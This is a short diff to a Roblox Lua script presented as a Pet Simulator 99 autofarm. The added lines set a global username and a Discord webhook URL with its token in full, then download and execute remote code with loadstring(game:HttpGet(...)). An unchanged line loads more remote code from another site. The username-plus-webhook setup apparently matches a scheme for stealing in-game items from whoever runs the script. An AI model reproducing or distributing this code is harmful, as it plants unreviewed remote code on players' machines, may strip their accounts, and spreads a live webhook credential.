@@ -1,2 +1,5 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CloudsScripts/ps99autofarm1.0/refs/heads/main/beta"))()
+_G.username = "CloudsScripts_onYTB"
+_G.Webhook = "https://discord.com/api/webhooks/1328339269760192542/kTLZ_JHc3_dGiKTVJDSmOTA1HqXmxb-R637kNmRU5uvywrrkNcX1RqGw1-NHeIqHDg8q"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PS99/main/PetSimulator99AutoFarm.lua"))()
+
 loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
